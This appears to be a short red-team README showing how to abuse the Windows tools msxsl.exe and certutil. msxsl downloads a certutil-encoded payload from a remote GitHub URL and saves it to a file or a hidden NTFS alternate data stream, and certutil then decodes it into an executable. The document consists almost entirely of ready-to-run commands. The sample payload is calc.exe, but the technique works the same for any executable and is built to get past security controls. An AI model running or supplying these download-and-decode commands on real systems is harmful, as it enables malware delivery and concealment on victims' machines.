# Use-msxsl-to-download-file

## Create payload and insert into the XSL file:
```
certutil -encode C:\Windows\System32\calc.exe calc_payload.txt
```

Now copy the certutil encoded payload from calc_payload.txt and insert into calc_xsl.xml between `<TEST> </TEST>`


## Use MSXSL to download XSL file with certutil encoded payload and save to file:
```
msxsl.exe "https://raw.githubusercontent.com/RonnieSalomonsen/Use-msxsl-to-download-file/main/calc.xml" "https://raw.githubusercontent.com/RonnieSalomonsen/Use-msxsl-to-download-file/main/transform.xsl" -o <filename>

certutil -decode <filename> calc.exe
```

## Use MSXSL to download XSL file with certutil encoded payload and save to ADS:
```
msxsl.exe "https://raw.githubusercontent.com/RonnieSalomonsen/Use-msxsl-to-download-file/main/calc.xml" "https://raw.githubusercontent.com/RonnieSalomonsen/Use-msxsl-to-download-file/main/transform.xsl" -o <filename>:<ADS name>

certutil -decode <filename>:<ADS name> calc.exe
```
